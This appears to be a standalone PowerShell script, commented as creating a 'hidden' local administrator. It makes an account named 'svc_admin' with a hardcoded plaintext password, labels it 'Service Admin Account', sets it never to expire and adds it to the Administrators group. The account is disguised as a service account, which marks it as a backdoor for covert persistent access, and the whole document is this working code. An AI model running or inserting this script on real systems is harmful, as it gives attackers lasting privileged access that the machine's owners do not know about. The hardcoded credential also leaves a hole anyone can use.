# Create hidden local admin user
$user = "svc_admin"
$pass = ConvertTo-SecureString "SuperSecurePassword123!" -AsPlainText -Force
New-LocalUser -Name $user -Password $pass -Description "Service Admin Account" -AccountNeverExpires -UserMayNotChangePassword
Add-LocalGroupMember -Group "Administrators" -Member $user
